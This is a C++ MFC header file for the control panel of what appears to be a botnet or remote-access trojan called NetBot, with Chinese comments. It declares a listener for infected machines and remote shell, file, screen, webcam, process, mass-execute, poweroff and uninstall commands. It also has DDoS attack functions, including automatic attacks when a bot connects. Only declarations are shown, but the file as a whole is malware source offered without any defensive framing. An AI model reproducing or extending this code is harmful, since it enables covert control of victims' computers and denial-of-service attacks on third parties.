// NetBotDlg.h : header file
//

#if !defined(AFX_NETBOTDLG_H__BB9059F8_4A64_4030_803F_6E0F70618CFD__INCLUDED_)
#define AFX_NETBOTDLG_H__BB9059F8_4A64_4030_803F_6E0F70618CFD__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "./ExControl/TrueColorToolBar.h"
#include "./ExClass/SEU_QQwry.h"
#include "./ExClass/IniFile.h"
#include "./ExClass/AutoLock.h"

#include "FileDlg.h"
#include "ScreenDlg.h"
#include "ProcessDlg.h"
#include "ShellDlg.h"
#include "VideoDlg.h"

#include "DDosDlg.h"
#include "FileTranDlg.h"
#include "ServerDlg.h"
#include "SetDlg.h"
#include "UpdateDlg.h"

#include "../Seu_lib/Command.h"
#include <winsock2.h>
#pragma comment (lib,"ws2_32.lib")

#include <vector>

//#include "start.h"

typedef struct tagAutoAttack {
    BOOL  bAutoAttack;
    DWORD dwAttackType;
    char  szAttackIP[200];  //攻击IP
    int   iAttackPort;      //攻击端口
    int   iAttackThread;
} AutoAttack;
/////////////////////////////////////////////////////////////////////////////
// CNetBotDlg dialog

class CNetBotDlg : public CDialog
{
// Construction
public:
    std::vector<CDialog*> m_DialogList; // 打开的对话框列表

    CNetBotDlg(CWnd* pParent = NULL);	// standard constructor

    CRITICAL_SECTION m_cs;

    void Lock()
    {
        EnterCriticalSection(&m_cs);
    }
    void Unlock()
    {
        LeaveCriticalSection(&m_cs);
    }

public:
    void  StatusTextOut(int iPane, LPCTSTR ptzFormat, ...);

    int   AttackStop(int task);
    int   AttackTask(int task,CString ip,int port,int type,int thread,int num,BOOL bAutoAttack = FALSE);
    int   AttackSpiderCC(int task,CString ip,int port,int thread,int num,int iBegin,int iEnd);
    DWORD AcceptSocket(SOCKET socket);
    void  StartListen(int Port);
    void  StopListen();

private:
    HANDLE  hAcceptThread;        //accept线程
    HANDLE  hCheckThread;         //Check线程

    SOCKET  m_ListenSock;
    SOCKET  m_CurrSock;
    int     m_CurrIndex;

    int     m_ListenPort;         //监听端口
    int     m_ConnectMax;         //最大连接数

    AutoAttack m_AutoAttack;      //上线自动攻击

private:
    DWORD ThreadAccept();           //接受服务端连接线程
    DWORD ThreadCheck();            //在线检测线程
    int checkfun();
    void ListenError(int ErrorCode);
    /////////////////////////////
    //字符串函数
    //inline函数不生成.MAP文件或CALL指令
    ////////////////////////////

    enum { IDD = IDD_NETBOT_DIALOG };
    CListCtrl m_OnLineList;
    CString	  m_ExecUrl;
    CString	  m_OpenUrl;
    int		m_SelNum;

public:
    virtual BOOL DestroyWindow();
    virtual BOOL PreTranslateMessage(MSG* pMsg);
protected:
    virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV support

// Implementation
protected:
    HICON m_hIcon;

    CDDosDlg     m_DDosDlg;
    CFileTranDlg m_TranDlg;

    CIniFile          m_Ini;
    SEU_QQwry         m_QQDat;
    CTrueColorToolBar m_wndtoolbar;
    CStatusBarCtrl    m_wndStatusBar;
    CImageList        m_ImageOnlinelist;

protected:
    void EnableOnlineCtrls(BOOL bEnable);
    void CreateIniFile();
    // Generated message map functions
    virtual BOOL OnInitDialog();
    afx_msg void OnPaint();
    afx_msg HCURSOR OnQueryDragIcon();
    afx_msg void OnClickListOnline(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg void OnRclickListOnline(NMHDR* pNMHDR, LRESULT* pResult);
    afx_msg void OnOnlinePoweroff();
    afx_msg void OnOnlineReboot();
    afx_msg void OnOnlineLogoff();
    afx_msg void OnOnlineUninstall();
    afx_msg void OnOnlineFilemanage();
    afx_msg void OnOnlineScreen();
    afx_msg void OnOnlineProcess();
    afx_msg void OnOnlineShell();
    afx_msg void OnBtnMulpoweroff();
    afx_msg void OnBtnMulreboot();
    afx_msg void OnBtnMulexec();
    afx_msg void OnBtnMulopen();
    afx_msg void OnBtnTupdate();
    afx_msg void OnBtnTserver();
    afx_msg void OnBtnTonline();
    afx_msg void OnBtnThelp();
    afx_msg void OnBtnTexit();
    afx_msg void OnBtnTddos();
    afx_msg void OnBtnTconfig();
    afx_msg void OnBtnTwebsite();
    afx_msg void OnOnlineVideo();
    afx_msg void OnBtnSelNum();
    afx_msg void OnBtnTfiletran();
    afx_msg void OnOnlineRestart();

    afx_msg void    OnSelectComputer(UINT nID);
    afx_msg LRESULT OnCloseEvent(WPARAM /*wParam*/, LPARAM /*lParam*/);
    afx_msg LRESULT OnFileDlgShow(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT OnScreenDlgShow(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT OnProcessDlgShow(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT OnShellDlgShow(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT OnVideoDlgShow(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT OnSerDown(WPARAM   wparam,LPARAM   lparam);
    DECLARE_MESSAGE_MAP()
};

#endif
